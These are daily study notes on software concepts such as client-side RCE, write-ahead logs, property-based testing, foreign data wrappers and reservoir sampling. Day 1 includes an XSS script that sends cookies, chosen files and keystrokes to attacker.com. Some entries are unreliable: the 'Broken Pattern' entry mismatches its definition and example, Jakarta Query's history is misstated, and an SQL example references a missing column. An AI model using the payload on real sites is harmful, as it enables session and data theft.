day - 1

## Client-Side RCE(Remote Code Execution)

### Definition:

Client-Side Remote Code Execution (RCE) is a security vulnerability that allows an attacker to execute malicious code on a victim's device (browser, mobile app, or client application) by exploiting flaws in client-side software. Unlike server-side RCE, this targets the user's machine directly, potentially giving attackers access to local files, system resources, or personal data.

**Key Characteristics**

- Target: User's device/browser, not the server
- Execution context: Runs with user's privileges
- Attack vector: Malicious websites, downloads, or client applications
- Impact: Can access local files, steal data, install malware

### Example:

- XSS leading to Client-Side RCE
  Vulnerable Website (Forum):

```
<!-- Vulnerable comment system that doesn't sanitize input -->
<div class="comment">
    <!-- Attacker posts this "comment" -->
    <script>
        // Malicious payload executed in victim's browser

        // 1. Steal cookies and session data
        fetch('http://attacker.com/steal', {
            method: 'POST',
            body: 'cookies=' + document.cookie
        });

        // 2. Access local storage
        const userData = localStorage.getItem('userPreferences');

        // 3. Try to access local files (if permissions allow)
        if (window.File && window.FileReader) {
            // Trick user into selecting files
            const input = document.createElement('input');
            input.type = 'file';
            input.onchange = function(e) {
                const file = e.target.files[0];
                const reader = new FileReader();
                reader.onload = function(e) {
                    // Send file contents to attacker
                    fetch('http://attacker.com/files', {
                        method: 'POST',
                        body: e.target.result
                    });
                };
                reader.readAsText(file);
            };
            input.click();
        }

        // 4. Keylogger
        document.addEventListener('keypress', function(e) {
            fetch('http://attacker.com/keys', {
                method: 'POST',
                body: 'key=' + e.key
            });
        });
    </script>
</div>
```

What happens when victim visits:

```
1. Victim visits forum page
2. Malicious script executes in victim's browser
3. Script runs with victim's permissions
4. Attacker gains access to:
   - Cookies and session tokens
   - Local storage data
   - Potentially local files
   - Keystroke logging
```

Prevention:

```
// ✅ Secure practices
// 1. Input sanitization
const sanitized = DOMPurify.sanitize(userInput);

// 2. Content Security Policy
<meta http-equiv="Content-Security-Policy"
      content="default-src 'self'; script-src 'self'">

// 3. Secure Electron config
webPreferences: {
    nodeIntegration: false,
    contextIsolation: true,
    preload: path.join(__dirname, 'preload.js')
}
```

---

day - 2

## Write Ahead Log(WAL)

### Definition:

Write Ahead Log (WAL) is a technique used in distributed systems where all changes are first written to a durable log before being applied to the actual data. This ensures data consistency, enables crash recovery, and helps maintain data integrity across multiple nodes. The key principle is: "log first, then apply changes."

### Example:

- PostgreSQL Database Cluster

```
-- User executes: UPDATE users SET balance = 500 WHERE id = 123;

-- Step 1: WAL entry written to disk FIRST
WAL Record:
{
  "lsn": "0/1B000028",
  "type": "UPDATE",
  "table": "users",
  "old_data": {"id": 123, "balance": 400},
  "new_data": {"id": 123, "balance": 500},
  "transaction_id": "TXN_456"
}

-- Step 2: Only AFTER WAL is on disk, apply to database
-- Step 3: Eventually, WAL gets replicated to standby servers
```

Recovery Process:

```
Primary Server Crashes!

Standby Server:
1. Reads WAL from shared storage
2. Replays all WAL entries since last checkpoint
3. Becomes new primary
4. No data lost! ✓
```

WAL in Distributed Systems:

```text
┌─────────────┐    ┌─────────────┐    ┌─────────────┐
│   Client    │    │   Node 1    │    │   Node 2    │
└─────────────┘    └─────────────┘    └─────────────┘
       │                   │                   │
       │ 1. Write Request  │                   │
       ├──────────────────>│                   │
       │                   │ 2. Write to WAL   │
       │                   ├──────────────────>│
       │                   │ 3. WAL Synced     │
       │                   │<──────────────────┤
       │                   │ 4. Apply Changes  │
       │                   │ 5. Apply Changes  │
       │                   ├──────────────────>│
       │ 6. Success        │                   │
       │<──────────────────┤                   │
```

---

Day - 3

## Property-Based Testing

### Definition:

Property-Based Testing is a software testing approach that verifies general properties or invariants of your code by automatically generating hundreds or thousands of random test inputs. Instead of writing specific test cases with fixed inputs and outputs, you define properties that should always be true, and the testing framework generates diverse inputs to try to break those properties.

### Example:

- Testing String Reverse Function

```
from hypothesis import given, strategies as st

def reverse_string(s):
    return s[::-1]

# Property-based tests
@given(st.text())
def test_reverse_properties(s):
    reversed_s = reverse_string(s)

    # Property 1: Length preserved
    assert len(reversed_s) == len(s)

    # Property 2: Reversing twice gives original
    assert reverse_string(reversed_s) == s

    # Property 3: First char becomes last char
    if len(s) > 0:
        assert s[0] == reversed_s[-1]
        assert s[-1] == reversed_s[0]

# Hypothesis automatically generates:
# "", "a", "hello", "🙂🎉", "\n\t", "a" * 1000, etc.
```

- Testing Banking Transfer System

```
class BankAccount {
    private BigDecimal balance;

    public void transfer(BankAccount to, BigDecimal amount) {
        if (balance.compareTo(amount) >= 0) {
            this.balance = this.balance.subtract(amount);
            to.balance = to.balance.add(amount);
        } else {
            throw new InsufficientFundsException();
        }
    }
}

@Property
public void transferProperties(
    @ForAll @BigRange(min = "0", max = "10000") BigDecimal initialFromBalance,
    @ForAll @BigRange(min = "0", max = "10000") BigDecimal initialToBalance,
    @ForAll @BigRange(min = "0", max = "15000") BigDecimal transferAmount) {

    BankAccount from = new BankAccount(initialFromBalance);
    BankAccount to = new BankAccount(initialToBalance);

    BigDecimal totalBefore = initialFromBalance.add(initialToBalance);

    try {
        from.transfer(to, transferAmount);

        // Property 1: Money is conserved (no money created/destroyed)
        BigDecimal totalAfter = from.getBalance().add(to.getBalance());
        assertEquals(totalBefore, totalAfter);

        // Property 2: Transfer amount was deducted correctly
        assertEquals(initialFromBalance.subtract(transferAmount), from.getBalance());
        assertEquals(initialToBalance.add(transferAmount), to.getBalance());

    } catch (InsufficientFundsException e) {
        // Property 3: Exception only thrown when insufficient funds
        assertTrue(initialFromBalance.compareTo(transferAmount) < 0);

        // Property 4: Balances unchanged on failed transfer
        assertEquals(initialFromBalance, from.getBalance());
        assertEquals(initialToBalance, to.getBalance());
    }
}
```

Popular Tools:

- Java: JUnit-QuickCheck, jqwik
- Python: Hypothesis
- JavaScript: JSVerify, fast-check
- Haskell: QuickCheck (original)
- C#: FsCheck

---

Day - 4

## ECMP (Equal-Cost Multi-Path)

### Definition:

ECMP (Equal-Cost Multi-Path) is a networking strategy that distributes traffic across multiple paths of equal cost to reach the same destination. In software testing, ECMP testing involves verifying that network traffic is properly load-balanced across multiple equal routes, ensuring optimal bandwidth utilization, fault tolerance, and proper failover behavior.

**Key Features**

- Load distribution: Traffic spread across multiple equal paths
- Fault tolerance: Automatic rerouting when paths fail
- Bandwidth utilization: Maximum use of available network capacity
- Dynamic balancing: Real-time adjustment based on network conditions

### Example:

- Data Center Network Testing
  Network Setup:

```
[Client]
        |
   [Load Balancer]
    /    |    \
Path A  Path B  Path C  (All equal cost)
   |      |      |
[Server1][Server2][Server3]
```

---

Day - 5

## Foreign Data Wrapper(FDW)

### Definition:

Foreign Data Wrappers (FDW) is a PostgreSQL feature that allows you to access and query data from external sources (other databases, files, APIs, web services) as if they were regular tables in your local database. It creates a "virtual window" to remote data without actually storing it locally, enabling seamless integration across different data systems.

**Key Features**

- Transparent access: Query external data using standard SQL
- Real-time data: Always fetches current data from source
- No data duplication: Data stays in original location
- Cross-database joins: Combine local and remote data
- Multiple sources: Connect to various database types and services

### Example:

- E-commerce company with data in multiple systems

```
-- Connect to different data sources

-- 1. Sales data in MySQL
CREATE FOREIGN TABLE mysql_sales (
    sale_id INTEGER,
    product_id INTEGER,
    amount DECIMAL(10,2),
    sale_date DATE
) SERVER mysql_server OPTIONS (table_name 'sales');

-- 2. Product data in MongoDB
CREATE FOREIGN TABLE mongo_products (
    product_id INTEGER,
    product_name TEXT,
    category TEXT,
    price DECIMAL(10,2)
) SERVER mongo_server OPTIONS (collection 'products');

-- 3. Customer data in CSV files
CREATE FOREIGN TABLE csv_customers (
    customer_id INTEGER,
    name TEXT,
    region TEXT,
    signup_date DATE
) SERVER file_server OPTIONS (
    filename '/data/customers.csv',
    format 'csv',
    header 'true'
);

-- 4. Web analytics from REST API
CREATE FOREIGN TABLE api_pageviews (
    page_url TEXT,
    views INTEGER,
    date DATE
) SERVER api_server OPTIONS (
    endpoint 'https://analytics.company.com/api/pageviews'
);
```

- Cross-System Analytics Query

```
-- Generate comprehensive sales report combining all sources
SELECT
    mp.category,
    mp.product_name,
    cc.region,
    SUM(ms.amount) as total_sales,
    COUNT(ms.sale_id) as num_transactions,
    AVG(apv.views) as avg_page_views
FROM mysql_sales ms
JOIN mongo_products mp ON ms.product_id = mp.product_id
JOIN csv_customers cc ON ms.customer_id = cc.customer_id
LEFT JOIN api_pageviews apv ON apv.page_url LIKE '%' || mp.product_name || '%'
WHERE ms.sale_date >= '2024-01-01'
GROUP BY mp.category, mp.product_name, cc.region
ORDER BY total_sales DESC;
```

---

Day - 8

## Broken Pattern

### Definition:

The broker pattern, also known as the intermediary pattern, inserts a middleman called a broker between service users (also known as clients) and service providers (servers). The client is fully disconnected from the servers and has no knowledge of them. When a client requires a service, it asks a broker over a service interface, and the broker forwards the request to the appropriate server, which handles the request. The server returns the outcome of its action to the broker that forwards the result (together with any exceptions) to the client that initiated the request.

### Example:

- Broken Singleton Pattern

```
// BROKEN: Not thread-safe, can create multiple instances
public class DatabaseConnection {
    private static DatabaseConnection instance;
    private Connection connection;

    private DatabaseConnection() {
        // Expensive database connection setup
        this.connection = DriverManager.getConnection("jdbc:mysql://localhost/db");
    }

    // PROBLEM: Two threads can both see instance as null
    public static DatabaseConnection getInstance() {
        if (instance == null) {
            instance = new DatabaseConnection();  // Race condition!
        }
        return instance;
    }

    public void executeQuery(String sql) {
        // PROBLEM: Single connection shared by all threads
        Statement stmt = connection.createStatement();
        stmt.execute(sql);  // Concurrent access issues!
    }
}

// Usage that breaks:
// Thread 1: DatabaseConnection.getInstance()
// Thread 2: DatabaseConnection.getInstance() (simultaneously)
// Result: Two instances created, defeating Singleton purpose
```

---

day - 9

## AMQP (Advanced Message Queuing Protocol)

### Definition:

AMQP (Advanced Message Queuing Protocol) is an open standard messaging protocol that enables reliable, secure, and interoperable message communication between applications and systems. It provides features like message routing, queuing, reliability guarantees, and security, making it ideal for building distributed systems that need asynchronous communication between components.

**Key Features**

- Message routing: Flexible routing using exchanges and binding keys
- Reliability: Message persistence, acknowledgments, and delivery guarantees
- Interoperability: Works across different platforms and languages
- Security: Built-in authentication, authorization, and encryption
- Flow control: Prevents message overflow and system overload

### Example:

Microservices Communication

```text
[Order Service] ──→ [AMQP Exchange] ──→ [Payment Queue] ──→ [Payment Service]
                         │
                         ├──→ [Inventory Queue] ──→ [Inventory Service]
                         │
                         └──→ [Shipping Queue] ──→ [Shipping Service]
```

---

day - 10

## Reactive Scaling

### Definition:

Reactive Scaling is an automatic system behavior where computing resources (servers, containers, etc.) are added or removed in response to current demand or performance metrics. The system "reacts" to changes in workload by scaling up when busy and scaling down when idle.

**How It Works**

- Monitor metrics: CPU usage, memory, request queue length
- Trigger scaling: When thresholds are crossed
- Add/remove resources: Automatically spin up or shut down instances
- Return to baseline: Scale back down when demand decreases

### Example:

**Netflix on Friday Night:**

**Normal Day (Tuesday 2 PM):**

- Low viewership = 100 servers running
- CPU usage: 30%

**Friday Night (8 PM):**

- Everyone starts watching = demand spikes
- CPU usage hits 80% threshold
- Reactive scaling triggers: Automatically adds 300 more servers
- Total: 400 servers handling the load

**Late Night (2 AM):**

- Viewership drops = CPU usage falls to 20%
- Reactive scaling triggers: Automatically removes 250 servers
- Back to 150 servers (slightly higher baseline for weekend)

---

day - 11

## Sociotechnical Design in Software Development

### Definition:

Sociotechnical Design is an approach to software development that considers both technical systems and human/social factors as equally important and interconnected. It recognizes that successful software solutions must account for how people work, communicate, collaborate, and organize themselves, not just the technical architecture. The goal is to design systems that fit naturally into human workflows and social structures.

**Key Principles**

- Human-centered: Design around how people actually work
- Social context: Consider team dynamics, culture, and communication patterns
- Technical-social alignment: Technology should support, not hinder, social interactions
- Organizational fit: Systems should match organizational structure and processes
- Continuous adaptation: Design evolves with changing social and technical needs

### Example:

```
Like designing a kitchen - you don't just consider the technical specs of appliances (technical design), but also how the family cooks together, their eating habits, cultural food preferences, who does the cleaning, and how they move around the space (sociotechnical design). A perfectly efficient kitchen layout that ignores how the family actually lives and works together will be frustrating and unused!
```

[link-1](https://www.infoq.com/news/2025/09/sociotechnical-design/?utm_campaign=infoq_content&utm_source=infoq&utm_medium=feed&utm_term=global)
[link-2](https://www.infoq.com/news/2025/05/sociotechnical-complexity/)

---

Day - 12

## Jakarta Query

### Definition:

Jakarta Query (formerly JPA Criteria API) is a Java specification that allows developers to build database queries programmatically using Java code instead of writing SQL strings. It provides a type-safe, object-oriented way to construct dynamic queries at runtime.

**Key Features**

- Type-safe: Compile-time checking prevents SQL errors
- Dynamic: Build queries conditionally based on user input
- Database-agnostic: Works across different database systems
- IDE-friendly: Auto-completion and refactoring support

### Example:

Traditional SQL String:

```
String sql = "SELECT p FROM Person p WHERE p.age > 25 AND p.city = 'New York'";
```

Jakarta Query (Criteria API):

```
CriteriaBuilder cb = entityManager.getCriteriaBuilder();
CriteriaQuery<Person> query = cb.createQuery(Person.class);
Root<Person> person = query.from(Person.class);

query.select(person)
     .where(cb.and(
         cb.greaterThan(person.get("age"), 25),
         cb.equal(person.get("city"), "New York")
     ));

List<Person> results = entityManager.createQuery(query).getResultList();
```

---

day - 15

## PinConsole

### Definition:
PinConsole is a Unified Internal Developer Platform (IDP) that centralizes all development tools, workflows, and resources into a single, easy-to-use interface. It streamlines the software development lifecycle by providing developers with seamless access to code repositories, CI/CD pipelines, monitoring dashboards, and collaboration tools—all in one place. This helps improve productivity, reduce context-switching, and foster better team collaboration.

### Example:
Imagine a software team building an app. Normally, developers switch between different tools like GitHub for code, Jenkins for builds, Jira for tickets, and Slack for communication.

PinConsole brings all these tools into one single platform, so a developer can:

Write and review code,
Trigger and monitor builds,
Track tasks and bugs,
Communicate with teammates,
without leaving the same interface.

This unified approach helps teams work faster and more efficiently.

reference: [Link-1](https://www.infoq.com/news/2025/09/pinterest-pinconsole-unified-idp/?utm_campaign=infoq_content&utm_source=infoq&utm_medium=feed&utm_term=global)
[Link-2](https://medium.com/pinterest-engineering/developer-experience-at-pinterest-the-journey-to-pinconsole-b34ac9e3bdd9)

---

day - 16

## Gall's Law

### Definition:
Gall's Law states that:

"A complex system that works is invariably found to have evolved from a simple system that worked. A complex system designed from scratch never works and cannot be patched up to make it work. You have to start over with a working simple system."

In simple terms: 🌱 → 🌳
Start small and grow gradually, rather than building something complex from the beginning.

### Example:
🌐 Facebook
- Started: Simple college directory for Harvard students
- Evolved: Global social media platform with billions of users
- Key: Each expansion built upon the previous working version

🛒 Amazon
- Started: Basic online bookstore
- Evolved: Massive e-commerce empire + cloud services + AI
- Key: Added one feature/category at a time

💻 Unix Operating System
- Started: Simple, minimal OS with basic functions
- Evolved: Foundation for Linux, macOS, and countless systems
- Key: Small, working components that could be combined

---

day - 17

## Database-as-a-Service (DBaaS)

### Definition:
Database-as-a-Service (DBaaS) is a cloud-based service model where a third-party provider hosts, manages, and maintains database infrastructure, allowing users to access and use databases without handling the underlying hardware, software, or administration tasks.

In simple terms:
Instead of building and maintaining your own database server (like owning a house), you rent database services from a provider (like staying in a hotel).

**How It Works**
```
graph LR
    A[Your Application] --> B[Internet] --> C[DBaaS Provider] --> D[Managed Database]
    E[Automatic Backups] --> C
    F[Security Updates] --> C
    G[Scaling] --> C
```

### Example:
Amazon RDS
- What: Managed relational databases (MySQL, PostgreSQL, etc.)
- You get: Database without server management
- Provider handles: Backups, updates, scaling, security

---

day - 18

## Sidecar Pattern

### Definition:
The Sidecar Pattern is a software architecture design where additional functionality is attached to an application by deploying it in a separate but closely connected container or process, similar to how a motorcycle sidecar attaches to provide extra capability without modifying the main vehicle.

In simple terms: Enhanced functionality
Add features to your app without changing the main code by running helper services alongside it.

**How It Works**
- Main container: Your actual application
- Sidecar container: Helper services (logging, monitoring, etc.)
- Shared resources: Network, storage volumes
- Separate concerns: Each container has one responsibility

### Example:
E-commerce Website with Security Sidecar
```text
┌─────────────────┐    ┌──────────────────┐
│  Shopping App   │    │ Security Sidecar │
│ ┌─────────────┐ │    │ ┌──────────────┐ │
│ │• Orders     │ │◄──►│ │• SSL/TLS     │ │
│ │• Inventory  │ │    │ │• Auth tokens │ │
│ │• Products   │ │    │ │• Rate limits │ │
│ └─────────────┘ │    │ │• Logging     │ │
└─────────────────┘    │ └──────────────┘ │
                       └──────────────────┘
```

---

day - 19

## Recreate Deployment

### Definition:
Recreate Deployment is a deployment strategy where the old version of an application is completely shut down before the new version is deployed. This creates a brief period of downtime during the transition, but ensures that only one version of the application runs at any given time.

**How It Works**
- Stop the current version (all instances go down)
- Deploy the new version
- Start the new version
- Brief downtime occurs between steps 1 and 3

### Example:
E-commerce Website Update
Before Deployment:
```
🟢 Website v1.0 (Running)
- 3 servers handling customer traffic
- Users can browse and purchase products
```

During Recreate Deployment:
```
🔴 All servers stopped
- Website completely offline
- Users see "Site temporarily unavailable"
- Duration: 5-15 minutes typically
```

After Deployment:
```
🟢 Website v2.0 (Running)
- 3 new servers with updated version
- Users can access the new features
```

---

day - 22

## Boy Scout Rule

### Definition:
The Boy Scout Rule in software development states: "Always leave the code cleaner than you found it." Just like Boy Scouts leave campsites better than they found them, developers should improve code quality whenever they touch it, even if they're just fixing a small bug.

**Core Principle**
Make small, incremental improvements every time you work on code. You don't need to refactor everything - just clean up what you're already touching.

### Example:
You need to fix a bug in a checkout function
(Messy Code)
```
def processOrder(items, user_id, promo_code):
    total = 0
    for i in items:
        total = total + i['price']
    
    if promo_code == "SAVE10":
        total = total * 0.9
    elif promo_code == "SAVE20":
        total = total * 0.8
    
    # Bug was here: missing tax calculation
    tax = total * 0.08
    final_total = total + tax
    
    return final_total
```
Applying Boy Scout Rule
```
def calculate_order_total(items, user_id, promo_code):
    """Calculate total order amount including discounts and tax."""
    TAX_RATE = 0.08
    
    subtotal = sum(item['price'] for item in items)
    
    # Apply discount
    discount_multiplier = get_discount_multiplier(promo_code)
    discounted_total = subtotal * discount_multiplier
    
    # Add tax (fixed the original bug)
    tax = discounted_total * TAX_RATE
    return discounted_total + tax

def get_discount_multiplier(promo_code):
    """Return discount multiplier for given promo code."""
    discounts = {
        "SAVE10": 0.9,
        "SAVE20": 0.8
    }
    return discounts.get(promo_code, 1.0)
```

---

day - 23

## Zero Trust Principle

### Definition:
he Zero Trust Principle is a cybersecurity philosophy that assumes "never trust, always verify." Unlike traditional security that trusts anything inside the network perimeter, Zero Trust treats every user, device, and connection as potentially compromised - even if they're already inside your system.

**Core Motto**
"Trust nothing, verify everything"

### Example:
- Google's BeyondCorp:
```text
Employee wants to access Gmail admin panel:
┌─────────────────────────────────┐
│ 1. Multi-factor authentication  │
│ 2. Device certificate check     │
│ 3. User role verification       │
│ 4. Network location analysis    │
│ 5. Time-based access rules      │
│ 6. Behavioral pattern matching  │
└─────────────────────────────────┘
     ↓ All checks pass ↓
┌─────────────────────────────────┐
│ ✅ Grant minimal required access │
│ ⏰ Re-verify in 1 hour          │
└─────────────────────────────────┘
```

---

day - 24

## Read-Replica Pattern

### Definition:
he Read-Replica Pattern is a database architecture where you have one primary (master) database that handles all writes, and multiple read-only copies (replicas) that handle read queries. This separates read and write operations to improve performance and scalability.

**How It Works**
Primary database: Handles all INSERT, UPDATE, DELETE operations
Read replicas: Handle all SELECT queries
Data synchronization: Changes flow from primary to replicas
Load distribution: Spread read traffic across multiple replicas

### Example:
E-commerce Website
```text
👥 Users writing reviews/orders ──► 📊 Primary DB (Writes only)
                                      │
                                      ├── Sync ──► 📖 Read Replica 1
                                      ├── Sync ──► 📖 Read Replica 2  
                                      └── Sync ──► 📖 Read Replica 3
                                                    ▲
👥 Users browsing products ──────────────────────┘
   (Product listings, search, reviews)
```

---
day - 25

## Compression & Serialization

### Definition:
Serialization converts objects/data structures into a format that can be stored or transmitted (like turning a house into a blueprint). Compression reduces the size of data by removing redundancy (like vacuum-packing clothes). They're often used together to efficiently store and transfer data.

**Key Concepts**
- Serialization: Object → Bytes/String (JSON, XML, Binary)
- Compression: Large data → Smaller data (ZIP, GZIP, LZ4)
- Combined: Object → Serialized → Compressed → Transmitted

### Example:
Netflix Video Streaming:
- Serialization: Movie metadata → JSON
- Compression: Video files → H.264/H.265 codecs
- Result: 4K movie fits in reasonable download size

WhatsApp Messages:

- Serialization: Message object → Protocol Buffers
- Compression: Text → LZ4 compression
- Result: Millions of messages stored efficiently

---

day - 26    

## Tail Latency

### Definition:
Tail Latency refers to the slowest response times in a system - the "long tail" of the latency distribution. While most requests are fast, a small percentage (like the slowest 1% or 5%) can be dramatically slower, creating a poor user experience even when average performance looks good.

**Why It's Called "Tail" Latency**
In a graph of response times, most requests cluster on the left (fast), but some stretch out to the right forming a "tail" of slow requests.
```text
Number of Requests
     ▲
     │    📊
     │   ████
     │  ██████
     │ ████████
     │██████████ 🐍 ──── Tail (slow requests)
     └─────────────────────────► Response Time
     Fast ←            → Slow
```

### Example:
- Amazon's Discovery
```text
Tail latency increase of +100ms = -1% in sales
Why? That 1% of slow users represents:
├─ 1 million daily visitors
├─ 10,000 affected customers
└─ $50,000+ daily revenue loss
```

---

day - 29

## Merkle Trees

### Definition:
A Merkle Tree is a binary tree data structure where each leaf node contains a hash of a data block, and each non-leaf node contains a hash of its two child nodes. This creates a hierarchical structure that allows efficient and secure verification of large data sets.

**Key Properties:**
- Root hash: Single hash at the top representing the entire dataset
- Tamper-evident: Any change in data changes the root hash
- Efficient verification: Can verify specific data without downloading everything

### Example:
Let's say we have 4 transactions: A, B, C, D
```
        Root Hash
       /          \
   Hash(AB)      Hash(CD)
   /      \      /       \
Hash(A) Hash(B) Hash(C) Hash(D)
  |       |       |       |
  A       B       C       D
```
Step-by-step construction:

- Hash each transaction: Hash(A), Hash(B), Hash(C), Hash(D)
- Combine pairs: Hash(AB) = Hash(Hash(A) + Hash(B))
- Continue upward: Root = Hash(Hash(AB) + Hash(CD))

---

day - 30

## Reservoir Sampling

### Definition:
Reservoir Sampling is an algorithm for randomly selecting k items from a stream of n items where n is either very large or unknown. It ensures each item has an equal probability of being selected, using only one pass through the data and O(k) memory.

**Key Properties:**
- Single pass: Process data once as it arrives
- Constant memory: Only stores k items regardless of stream size
- Equal probability: Each item has exactly k/n chance of selection
- Unknown size: Works even when you don't know how many items total

Algorithm Steps:
1. Fill reservoir with first k items
2. For each subsequent item i (where i > k):
   - Generate random number j between 1 and i
   - If j ≤ k, replace reservoir[j] with current item

### Example:
Select 3 random songs from a playlist of unknown size
```
Stream: [Song1, Song2, Song3, Song4, Song5, Song6, Song7]
Reservoir size k = 3

Step 1: Fill reservoir with first 3 items
Reservoir: [Song1, Song2, Song3]

Step 2: Process Song4 (i=4)
- Random j between 1-4 → j=2
- j ≤ k (3), so replace reservoir[2] with Song4
Reservoir: [Song1, Song4, Song3]

Step 3: Process Song5 (i=5)
- Random j between 1-5 → j=5
- j > k (3), so keep current reservoir
Reservoir: [Song1, Song4, Song3]

Step 4: Process Song6 (i=6)
- Random j between 1-6 → j=1
- j ≤ k (3), so replace reservoir[1] with Song6
Reservoir: [Song6, Song4, Song3]

Step 5: Process Song7 (i=7)
- Random j between 1-7 → j=4
- j > k (3), so keep current reservoir
Final: [Song6, Song4, Song3]
```

Code example:
```
import random

def reservoir_sampling(stream, k):
    reservoir = []
    
    for i, item in enumerate(stream):
        if i < k:
            reservoir.append(item)
        else:
            j = random.randint(0, i)
            if j < k:
                reservoir[j] = item
    
    return reservoir
```

---